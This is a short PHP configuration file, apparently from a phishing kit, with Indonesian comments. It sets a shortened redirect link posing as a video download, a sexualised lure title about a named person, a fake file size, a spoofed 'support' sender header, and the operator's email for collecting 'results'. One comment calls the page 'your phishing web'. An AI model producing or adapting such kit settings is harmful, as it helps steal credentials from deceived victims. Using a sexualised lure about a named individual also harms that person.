<?php

$redirect = 'https://bit.ly/mediafire-arachuu'; // LINK DOWNLOAD VIDEO
$namavideo = 'AraChuu pap Susu'; // NAMA WEB PHISING MU
$download = '8,24MB'; // UKURAN DOWNLOAD

$sender = 'From: Web Arya ThiQo <support@gmail.com>'; // NAMA RESULT MU
$email = "emailmu@gmail.com"; // GANTI EMAIL MU

?>